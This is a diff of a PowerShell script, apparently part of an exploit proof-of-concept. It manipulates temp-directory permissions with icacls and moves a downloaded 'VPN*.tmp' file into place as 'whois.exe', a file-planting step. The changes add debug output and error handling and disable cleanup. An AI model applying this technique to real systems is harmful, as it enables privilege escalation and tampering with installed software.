@@ -47,23 +47,27 @@ Write-Host "[*] Reverting permissions"
 icacls $tempDir /remove:d "$env:USERNAME"
 
 Write-Host "[*] Renaming downloaded file for execution"
-# Rename the downloaded VPN file (if it follows the VPN*.tmp pattern)
 $downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
 
-# Debugging: Output the file path to check if it's valid
-Write-Host "[*] File to rename: $($downloadedFile.FullName)"
-
 if ($downloadedFile) {
-    # Ensure proper path construction using Join-Path
+    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
+    
+    # Construct the target path for the rename
     $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
     
-    # Rename the file
-    Rename-Item -Path $downloadedFile.FullName -NewName $targetPath -Force
-    Write-Host "[*] Renamed VPN*.tmp to whois.exe."
+    # Debug output: Check the target path
+    Write-Host "[*] Target path: $targetPath"
+    
+    # Try renaming (or moving) the file
+    try {
+        Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
+        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
+    } catch {
+        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
+        Exit
+    }
 } else {
     Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
-    # Revert permissions before exiting
-    icacls $tempDir /remove:d "$env:USERNAME"
     Exit
 }
 
@@ -82,5 +86,5 @@ Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
 
 # Optionally, clean up the temp directory if you want
-Remove-Item -Path $tempDir -Recurse -Force
-Write-Host "[*] Temp directory removed."
+#Remove-Item -Path $tempDir -Recurse -Force
+#Write-Host "[*] Temp directory removed."
